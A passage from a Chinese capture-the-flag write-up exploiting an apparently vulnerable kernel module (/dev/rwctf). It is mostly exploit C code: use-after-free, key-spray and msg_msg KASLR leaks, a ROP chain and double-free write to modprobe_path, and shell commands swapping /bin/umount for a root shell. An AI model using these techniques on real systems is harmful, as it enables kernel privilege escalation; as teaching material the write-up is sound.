0x20;\n    char *temp_buf = malloc(OBJ_SIZE);\n    memset(temp_buf,'a',OBJ_SIZE);\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,temp_buf);\n    rwctf_ioctl_kfree(0);\n                                            // #define O_WRONLY    00000001\n    seq_fd = open(\"/proc/self/stat\",0);     // #define O_RDONLY    00000000 \n    rwctf_ioctl_kfree(0);\n\n    char fake_seq_operations[OBJ_SIZE];\n    memset(fake_seq_operations,'0',OBJ_SIZE);\n    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;      // rip\n    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;\n    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;\n    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);\n    \n    __asm__(\n        \"mov r15, 0x0;\"      // 1\n        \"mov r14, pop_rax_ret;\"      // 2\n        \"mov r13, 0x782f706d742f;\"      // 3\n        \"mov r12, pop_rdi_ret;\"      // 4\n        \"mov r11, 0x11111111;\"\t\t\t\t// 7 null\n        \"mov r10, mov__rdi__rax_ret;\"      // 8\n        \"mov rbp, modprobe_path_addr;\"      // 5\n        \"mov rbx, pop_rbp_ret;\"      // 6  pop1,ret\n        \"mov r9, do_task_dead_func;\"       // 9\n        \"mov r8, 0x88888888;\"       // 10\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x20;\"\n        \"mov rsi, seq_read_buf;\"\n        \"mov rdi, seq_fd;\"          // read(seq_fd,seq_read_buf,0x20)，触发seq_operations->start函数指针，控制流劫持\n        \"syscall\"\n    );\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2);       // #define O_RDWR      00000002  \n    prepare(); \n    hijack();\n}\n```\n\n\n\n```\n思考：\n- 什么版本下可以使用modprobe_path方法？（在一篇文章中看到，2017年从linux4.11开始就提出了CONFIG_STATIC_USERMODEHELPER来防止modprobe_path被改。但是这个题目时linux5.19.0的，依然可以用这个方法。所以可能是处于性能？或其他原因未开启这个防护？）\n- 这道题能否用提权到root的方法获取flag？如何做？（可以，以root用户将umount改成/bin/sh，exit退出系统时就能获得root shell）\n```\n\n\n\n## 绕过KASLR\n\n为了绕过KASLR，需要通过UAF泄露出内核地址信息。\n\n### sys_add_key + UAF =》 越界读\n\n调用add_key系统调用存放密钥时，内核处理函数根据payload_len会有两次内存申请。第一次申请长度为`payload_len`，第二次在`user_preparse()`函数中，申请长度为`payload_len+0x18`（`strcut user_key_payload`结构体）。\n\n```c\nsyscall(\n        __NR_add_key,\n        type,\n        description,\n        payload,\n        payload_len,\n        keyring\n    );\n\nstruct user_key_payload {\n\tstruct rcu_head\trcu;\t\t/* RCU destructor */\n\tunsigned short\tdatalen;\t/* length of this data */\n\tchar\t\tdata[] __aligned(__alignof__(u64)); /* actual data */\n};\n```\n\n因此，以payload_len为`0x100-0x18`为例，我们可以构造如下调用顺序，使得漏洞ko的 `buf[1]` 跟add_key的 `strcut user_key_payload` 占用同一个堆块。在步骤7的时候，将 `user_key_payload.datalen` 改成一个超大值如0x1000，当下次读取该key时就能越界读出。\n\n ![image-20230206004424733](image-20230206004424733.png?size=600)\n\n观察了一下泄露出来的内存，没有发现合适的内核地址。因此需要进一步，往堆上喷内核地址。\n\n### sys_add_key + sys_keyctl =》 堆喷内核地址\n\n`sys_keyctl`中有一个 `KEYCTL_REVOKE ` ，它用于取消一个密钥。内核中，对应的处理流程是`_x64_sys_keyctl() -> keyctl_revoke_key() -> key_revoke() -> user_revoke() -> call_rcu()`，在`call_rcu()`函数中将 `user_key_payload` 结构体的 `rcu.func` 设置成`user_free_payload_rcu()`函数的地址（nokaslr的情况下是`0xffffffff813d8210`）。\n\n```c\nstruct callback_head {\n\tstruct callback_head *next;\n\tvoid (*func)(struct callback_head *head);\n} __attribute__((aligned(sizeof(void *))));\n#define rcu_head callback_head\n\nstruct user_key_payload {\n\tstruct rcu_head\trcu;\t\t/* RCU destructor */\n\tunsigned short\tdatalen;\t/* length of this data */\n\tchar\t\tdata[] __aligned(__alignof__(u64)); /* actual data */\n};\n```\n\n通过不断地add_key然后revoke_key，就能将`user_free_payload_rcu()`函数地址喷到堆中，再结合上一步地越界读，就可以稳定泄露一个内核地址了。\n\n## exp\n\n打完效果如下图\n\n![image-20230205181456003](image-20230205181456003.png?size=600)\n\n### 精简版\n\n```c\n// musl-gcc -static -masm=intel exp.c -o exp\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <time.h>\n#include <stdint.h>\n\n#define size_user_key_payload 24\n#define HEAP_SPRAY_COUNT 20\n\n#define KEY_SPEC_PROCESS_KEYRING\t-2\t/* - key ID for process-specific keyring */\n#define KEYCTL_REVOKE\t\t\t3\t/* revoke a key */\n#define KEYCTL_READ\t\t\t11\t/* read a key or keyring's contents */\n\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint g_fd;\nint seq_fd;\nint64_t seq_read_buf[4];\nint64_t g_kernel_base;\n\nint64_t kernel_elf_base = 0xFFFFFFFF81000000;\nint64_t pop_rax_ret = 0xffffffff81000ddb;\nint64_t pop_rdi_ret = 0xffffffff8106ab4d;\nint64_t mov__rdi__rax_ret = 0xffffffff81074e3c; //: mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;\nint64_t do_task_dead_func = 0xFFFFFFFF810A3190;\nint64_t modprobe_path_addr = 0xFFFFFFFF828510A0;\nint64_t add_rsp_170_ret = 0xffffffff819d9f4c;\nint64_t pop_rbp_ret = 0xffffffff810679ef;\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\nint key_alloc(char* description, char* payload, int payload_len)\n{\n    return syscall(\n        __NR_add_key,\n        \"user\",\n        description,\n        payload,\n        payload_len,\n        KEY_SPEC_PROCESS_KEYRING\n    );\n}\n\nint key_read(int key_id, char *retbuf, int retbuf_len)\n{\n    return syscall(\n        __NR_keyctl,\n        KEYCTL_READ,\n        key_id,\n        retbuf,\n        retbuf_len\n    );\n}\n\nint key_revoke(int key_id)\n{\n    return syscall(\n        __NR_keyctl,\n        KEYCTL_REVOKE,\n        key_id,\n        0,\n        0,\n        0\n    );\n}\n\nvoid prepare(){\n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo 'chmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(3);                           // 需要在这个间隙中，将modprobe_path改成/tmp/x\n        system(\"/tmp/dummy 2>/dev/null\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nvoid hijack(){\n    // re calc addr\n    pop_rax_ret = pop_rax_ret - kernel_elf_base + g_kernel_base;\n    pop_rdi_ret = pop_rdi_ret - kernel_elf_base + g_kernel_base;\n    mov__rdi__rax_ret = mov__rdi__rax_ret - kernel_elf_base + g_kernel_base;\n    do_task_dead_func = do_task_dead_func - kernel_elf_base + g_kernel_base;\n    modprobe_path_addr = modprobe_path_addr - kernel_elf_base + g_kernel_base; \n    pop_rbp_ret = pop_rbp_ret - kernel_elf_base + g_kernel_base; \n    add_rsp_170_ret = add_rsp_170_ret - kernel_elf_base + g_kernel_base;\n\n    int OBJ_SIZE = 0x20;\n    char *temp_buf = malloc(OBJ_SIZE);\n    memset(temp_buf,'a',OBJ_SIZE);\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,temp_buf);\n    rwctf_ioctl_kfree(0);\n\n    seq_fd = open(\"/proc/self/stat\",0);     // #define O_RDONLY    00000000 \n    rwctf_ioctl_kfree(0);\n\n    char fake_seq_operations[OBJ_SIZE];\n    memset(fake_seq_operations,'0',OBJ_SIZE);\n    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;      // rip\n    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;\n    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;\n    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);\n    \n    __asm__(\n        \"mov r15, 0x0;\"      // 1\n        \"mov r14, pop_rax_ret;\"      // 2\n        \"mov r13, 0x782f706d742f;\"      // 3\n        \"mov r12, pop_rdi_ret;\"      // 4\n        \"mov r11, 0x11111111;\"\t\t\t\t// 7null\n        \"mov r10, mov__rdi__rax_ret;\"      // 8\n        \"mov rbp, modprobe_path_addr;\"      // 5\n        \"mov rbx, pop_rbp_ret;\"      // 6  pop1,ret\n        \"mov r9, do_task_dead_func;\"       // 9\n        \"mov r8, 0x88888888;\"       // 10\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x20;\"\n        \"mov rsi, seq_read_buf;\"\n        \"mov rdi, seq_fd;\"          // read(seq_fd,seq_read_buf,0x20)\n        \"syscall\"\n    );\n}\n\nvoid leak(){\n    int OBJ_SIZE = 0x100;\n    char *temp_buf = malloc(OBJ_SIZE);\n    memset(temp_buf,'x',OBJ_SIZE);\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,temp_buf);   // 1\n    rwctf_ioctl_kmalloc(1,OBJ_SIZE,temp_buf);   // 2\n    rwctf_ioctl_kfree(1);                       // 3\n    rwctf_ioctl_kfree(0);                       // 4\n\n    int ADD_KEY_SIZE = OBJ_SIZE - size_user_key_payload;\n    char *payload = malloc(ADD_KEY_SIZE);\n    memset(payload, 'y', ADD_KEY_SIZE);\n    int key_id = key_alloc(\"description234\",payload,ADD_KEY_SIZE);      // 5\n\n    rwctf_ioctl_kfree(1);           // 6\n\n    *(unsigned long long *)&temp_buf[0x0] = 0;\n    *(unsigned long long *)&temp_buf[0x8] = 0;\n    *(unsigned long long *)&temp_buf[0x10] = 0x1000;\n    rwctf_ioctl_kmalloc(1,OBJ_SIZE,temp_buf);               // 7\n\n// spray: step 1\n    int test_id[30];\n    int i = 0;\n    int a = 0;\n    srand((unsigned)time(NULL));\n    char * tmp_desc = (char*)malloc(20);\n    memset(tmp_desc, 0, 20);\n    for(i =0; i < HEAP_SPRAY_COUNT; i++){\n        snprintf(tmp_desc, 20, \"a%x\", rand());\n        test_id[i] = key_alloc(tmp_desc,payload,ADD_KEY_SIZE);\n    }\n\n// spray: step 2 - revoke\n    for(i =0; i < HEAP_SPRAY_COUNT; i++){\n        key_revoke(test_id[i]);\n    }\n\n    char *retbuf1 = malloc(0x1000);\n    memset(retbuf1, 0, 0x1000);\n    int qqq = key_read(key_id,retbuf1,0x1000);\n\n// leak\n    int64_t offset_user_free_payload_rcu = 0xFFFFFFFF813D8210 - 0xFFFFFFFF81000000;\n    int64_t leak_addr = *(int64_t *)&retbuf1[0xf0];\n    g_kernel_base = leak_addr - offset_user_free_payload_rcu;\n    printf(\"[!] kernel_base : 0x%lx\\n\",g_kernel_base);\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2);       // #define O_RDWR      00000002  \n    prepare(); \n    leak();\n    hijack();\n}\n```\n\n\n\n### 调试版\n\n```c\n#define _GNU_SOURCE\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <err.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/timerfd.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <linux/keyctl.h>\n#include <time.h>\n\n#define size_user_key_payload 24\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n#define HEAP_SPRAY_COUNT 20\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint g_fd;\nint seq_fd;\nint64_t seq_read_buf[4];\nint64_t g_kernel_base;\n\nint64_t kernel_elf_base = 0xFFFFFFFF81000000;\nint64_t pop_rax_ret = 0xffffffff81000ddb;\nint64_t pop_rdi_ret = 0xffffffff8106ab4d;\nint64_t mov__rdi__rax_ret = 0xffffffff81074e3c; //: mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;\nint64_t add_rsp_160_ret = 0xffffffff81083932;\nint64_t do_task_dead_func = 0xFFFFFFFF810A3190;\nint64_t modprobe_path_addr = 0xFFFFFFFF828510A0;\nint64_t add_rsp_170_ret = 0xffffffff819d9f4c;\nint64_t pop_rbp_ret = 0xffffffff810679ef;\n\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\n\nint key_alloc(char* description, char* payload, int payload_len)\n{\n    return syscall(\n        __NR_add_key,\n        \"user\",\n        description,\n        payload,\n        payload_len,\n        KEY_SPEC_PROCESS_KEYRING\n    );\n}\n\nint key_read(int key_id, char *retbuf, int retbuf_len)\n{\n    return syscall(\n        __NR_keyctl,\n        KEYCTL_READ,\n        key_id,\n        retbuf,\n        retbuf_len\n    );\n}\n\nint key_revoke(int key_id)\n{\n    return syscall(\n        __NR_keyctl,\n        KEYCTL_REVOKE,\n        key_id,\n        0,\n        0,\n        0\n    );\n}\n\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\n\nvoid prepare(){\n    //system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\\\"#!/bin/sh\\\\n/bin/sh\\\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    \n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    // system(\"echo -n '#!/bin/sh\\n/bin/sh' > /tmp/getshell\");\n    // system(\"echo '#!/bin/sh\\n' > /tmp/x\");\n    // system(\"echo 'rm -rf /bin/umount\\n' >> /tmp/x\");\n    // system(\"echo 'mv /tmp/getshell /bin/umount\\n' >> /tmp/x\");\n    // system(\"echo 'chmod 777 /bin/umount\\n' >> /tmp/x\");\n    // system(\"echo '#!/bin/sh\\nchmod 777 /flag' > /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(3);                           // 需要在这个间隙中，将modprobe_path改成/tmp/x\n        system(\"/tmp/dummy 2>/dev/null\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\n\nvoid hijack(){\n    // re calc addr\n    pop_rax_ret = pop_rax_ret - kernel_elf_base + g_kernel_base;\n    pop_rdi_ret = pop_rdi_ret - kernel_elf_base + g_kernel_base;\n    mov__rdi__rax_ret = mov__rdi__rax_ret - kernel_elf_base + g_kernel_base;\n    add_rsp_160_ret = add_rsp_160_ret - kernel_elf_base + g_kernel_base;\n    do_task_dead_func = do_task_dead_func - kernel_elf_base + g_kernel_base;\n    modprobe_path_addr = modprobe_path_addr - kernel_elf_base + g_kernel_base; \n    pop_rbp_ret = pop_rbp_ret - kernel_elf_base + g_kernel_base; \n    add_rsp_170_ret = add_rsp_170_ret - kernel_elf_base + g_kernel_base;\n\n    int OBJ_SIZE = 0x20;\n    char *temp_buf = malloc(OBJ_SIZE);\n    memset(temp_buf,'a',OBJ_SIZE);\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,temp_buf);\n    rwctf_ioctl_kfree(0);\n                                            // #define O_WRONLY    00000001\n    seq_fd = open(\"/proc/self/stat\",0);     // #define O_RDONLY    00000000 \n    rwctf_ioctl_kfree(0);\n\n    char fake_seq_operations[OBJ_SIZE];\n    memset(fake_seq_operations,'0',OBJ_SIZE);\n    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;      // rip\n    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;\n    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;\n    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);\n\n    __asm__(\n        \"mov r15, 0x0;\"      // 1\n        \"mov r14, pop_rax_ret;\"      // 2\n        \"mov r13, 0x782f706d742f;\"      // 3\n        \"mov r12, pop_rdi_ret;\"      // 4\n        \"mov r11, 0x11111111;\"\t\t\t\t// 7null\n        \"mov r10, mov__rdi__rax_ret;\"      // 8\n        \"mov rbp, modprobe_path_addr;\"      // 5\n        \"mov rbx, pop_rbp_ret;\"      // 6  pop1,ret\n        \"mov r9, do_task_dead_func;\"       // 9\n        \"mov r8, 0x88888888;\"       // 10\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x20;\"\n        \"mov rsi, seq_read_buf;\"\n        \"mov rdi, seq_fd;\"          // read(seq_fd,seq_read_buf,0x20)\n        \"syscall\"\n    );\n}\n\nvoid leak(){\n    int OBJ_SIZE = 0x100;\n    char *temp_buf = malloc(OBJ_SIZE);\n    memset(temp_buf,'x',OBJ_SIZE);\n    rwctf_ioctl_kmalloc(0,OBJ_SIZE,temp_buf);   // 1\n    rwctf_ioctl_kmalloc(1,OBJ_SIZE,temp_buf);   // 2\n    rwctf_ioctl_kfree(1);                       // 3\n    rwctf_ioctl_kfree(0);                       // 4\n\n    int ADD_KEY_SIZE = OBJ_SIZE - size_user_key_payload;\n    char *payload = malloc(ADD_KEY_SIZE);\n    memset(payload, 'y', ADD_KEY_SIZE);\n    int key_id = key_alloc(\"description234\",payload,ADD_KEY_SIZE);      // 5\n\n    rwctf_ioctl_kfree(1);           // 6\n\n    *(unsigned long long *)&temp_buf[0x0] = 0;\n    *(unsigned long long *)&temp_buf[0x8] = 0;\n    *(unsigned long long *)&temp_buf[0x10] = 0x1000;\n    // for(i = 0;i<3;i++){\n        rwctf_ioctl_kmalloc(1,OBJ_SIZE,temp_buf);               // 7\n    // }\n    // 原exp的方法中，步骤6之前进行了大量堆喷的情况下，步骤7只做一次的话，分配到上一步kfree的堆块的概率很小，所以需要重复多次（如果把spray放到这一步的前面）\n\n// spray: step 1\n    int test_id[30];\n    int i = 0;\n    int a = 0;\n    srand((unsigned)time(NULL));\n    char * tmp_desc = (char*)malloc(20);\n    memset(tmp_desc, 0, 20);\n    for(i =0; i < HEAP_SPRAY_COUNT; i++){\n        snprintf(tmp_desc, 20, \"a%x\", rand());\n        // printf(\"[+]string: %s\\n\",tmp_desc);\n        test_id[i] = key_alloc(tmp_desc,payload,ADD_KEY_SIZE);\n        // printf(\"[+]test_id[%d]: 0x%x\\n\",i,test_id[i]);\n    }\n\n// spray: step 2 - revoke\n    for(i =0; i < HEAP_SPRAY_COUNT; i++){\n        key_revoke(test_id[i]);\n    }\n\n    char *retbuf1 = malloc(0x1000);\n    memset(retbuf1, 0, 0x1000);\n    int qqq = key_read(key_id,retbuf1,0x1000);\n\n// dump\n    // printf(\"---------------[8]------------\\n\");\n    // printf(\"[+] read ret : %d\\n\",qqq);\n    // if(qqq > 300){\n    //     hexdump(retbuf1,0x1000);\n    // }else{\n    //     printf(\"falied\\n\");\n    // }\n\n// leak\n    int64_t offset_user_free_payload_rcu = 0xFFFFFFFF813D8210 - 0xFFFFFFFF81000000;\n    int64_t leak_addr = *(int64_t *)&retbuf1[0xf0];\n    g_kernel_base = leak_addr - offset_user_free_payload_rcu;\n    printf(\"[+] kernel_base : 0x%lx\\n\",g_kernel_base);\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2);       // #define O_RDWR      00000002  \n    prepare(); \n    leak();\n    hijack();\n}\n```\n\n\n\n# 利用方法2\n\n## double free -> 任意地址写\n\n查看bzImage中kmalloc函数的实现，`prefetcht0`指令临近的前几条指令没有`xor`指令（不知道有没有更简单的判断方法），可以确定本题未开启`slab_freelist_hardened` 防护，因此可以利用double free实现任意地址写。\n\n以0x20大小的堆为例，double free过后，堆中内容如下图所示：\n\n![image-20230209210454379](image-20230209210454379.png?size=600)\n\n在关闭KASLR的情况下，利用 `任意地址写+modprobe_path` 能以root权限执行一条shell命令，获得flag。该部分exp如下\n\n```c\n// gcc exp.c -static -o exp\n#define _GNU_SOURCE\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <err.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/timerfd.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <linux/keyctl.h>\n#include <time.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include<sys/shm.h>\n\n#define OBJSIZE 0x20\n\nint g_fd;\n\nint64_t kernel_elf_base = 0xFFFFFFFF81000000;\nint64_t modprobe_path_addr = 0xFFFFFFFF828510A0;\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\nvoid aaw(int64_t* target_addr_p, char* target_cont_p){       \n    char* buf = malloc(OBJSIZE);\n    memset(buf,'a',OBJSIZE);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n    rwctf_ioctl_kfree(0);\n    rwctf_ioctl_kfree(0);                       // double free\n\n    memcpy(buf+0x10,target_addr_p,0x8);           \n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);             // hijack, aaw address\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,target_cont_p);             // aaw content\n}\n\nvoid prepare(){\n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo '\\nchmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(3);                           // 需要在这个间隙中，将modprobe_path改成/tmp/x\n        system(\"/tmp/dummy 2>/dev/null\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nint main(){\n    g_fd = open(\"/dev/rwctf\",2);       // #define O_RDWR      00000002  \n\n    prepare();         // 1. prepare /tmp/x & /tmp/dummy, then wait 3s to exec /tmp/dummy\n\n    int64_t target_addr = modprobe_path_addr;\n    char* target_cont_p = malloc(OBJSIZE);\n    memset(target_cont_p,'y',OBJSIZE);  \n    memcpy(target_cont_p,\"/tmp/x\\x00\",0x7);            \n    aaw(&target_addr,target_cont_p);     // 2. use aaw() to overwrite modprobe_path\n\n    return 0;\n}\n```\n\n## msg_msg+shm_file_data -> 泄露内核地址\n\n由于题目开启了KASLR选项，因此我们还需要泄露内核加载基址，才能完成利用。\n\n本题内核未开启`CONFIG_CHECKPOINT_RESTORE`选项，因此无法使用MSG_COPY特性。不过我们无需覆盖msg_msg结构体的内容，因此对我们的解法无影响。\n\nmsg_msg+shm_file_data结合本题漏洞ko的利用过程如下图所示：\n\n![image-20230209220917391](image-20230209220917391.png?size=600)\n\n1. 漏洞ko申请一个0x20大小的堆块A\n2. 漏洞ko释放该0x20大小堆块A\n3. 构造`msgsnd()`操作，使其内核中第二个数据块总大小为0x20，于是占用了刚刚释放的堆块A\n4. 因为漏洞ko存在UAF，借此能力继续释放堆块A。于是msg_msg中出现了一个悬空指针\n5. `shmat()`操作在内核中需要为`shm_file_data`结构体申请0x20大小的空间，于是拿到了刚刚释放的堆块A，并往堆块中写入内容（有内核地址）\n6. 通过`msgrcv()`就能把`shm_file_data`结构体内容泄露到用户态\n\n\n\n## 完整exp\n\n```c\n#define _GNU_SOURCE\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <err.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/timerfd.h>\n#include <sys/ioctl.h>\n#include <sys/syscall.h>\n#include <linux/keyctl.h>\n#include <time.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include<sys/shm.h>\n\n#define OBJSIZE 0x20\n\nint g_fd;\nint64_t g_kernel_base;\n\nint64_t kernel_elf_base = 0xFFFFFFFF81000000;\nint64_t modprobe_path_addr = 0xFFFFFFFF828510A0;\n\nstruct rwstruct{\n    unsigned int idx;\n    unsigned int size;\n    char* cont;\n};\n\nint rwctf_ioctl_kmalloc(int idx, int size, char* cont){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = size;\n    rw_buf.cont = cont;\n    ioctl(g_fd,0xDEADBEEF,&rw_buf);\n}\n\nint rwctf_ioctl_kfree(int idx){\n    struct rwstruct rw_buf;\n    rw_buf.idx = idx;\n    rw_buf.size = 0;\n    rw_buf.cont = 0;\n    ioctl(g_fd,0xC0DECAFE,&rw_buf);\n}\n\nvoid aaw(int64_t* target_addr_p, char* target_cont_p){       \n    char* buf = malloc(OBJSIZE);\n    memset(buf,'a',OBJSIZE);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n    rwctf_ioctl_kfree(0);\n    rwctf_ioctl_kfree(0);                       // double free\n\n    memcpy(buf+0x10,target_addr_p,0x8);           \n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);             // hijack, aaw address\n    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);\n    rwctf_ioctl_kmalloc(0,OBJSIZE,target_cont_p);             // aaw content\n}\n\nvoid prepare(){\n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\n/bin/sh\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo '\\nchmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(3);                           // 需要在这个间隙中，将modprobe_path改成/tmp/x\n        system(\"/tmp/dummy 2>/dev/null\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nint g_msqid;\nstruct g_msgp{\n  long type;\n  char mtext[0xfe8];    // 0x1000-0x30+0x20-0x8 = 0xFE8\n};\n\nint msg_msgget(key_t key,int msgflg) \n{\n    int msqid;\n    if((msqid = msgget(key,msgflg)) == -1){              \n        perror(\"msgget\");\n        exit(-1);\n    }\n    return msqid;\n}\n\nvoid msg_msgsnd(int msqid,void *msgp,size_t msgsz,int msgflg) \n{\n    if(msgsnd(msqid,msgp,msgsz,msgflg) == -1){          \n        perror(\"msgsnd\");\n        exit(-1);\n    }\n}\n\nssize_t msg_msgrcv(int msqid,void *msgp,size_t msgsz,long msgtyp,int msgflg) \n{\n    ssize_t result;\n    result = msgrcv(msqid,msgp,msgsz,msgtyp,msgflg);           \n    if (result<0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return result;\n}\n\nvoid msg_msgctl(int msqid,int cmd,struct msqid_ds *buf)         \n{\n    if 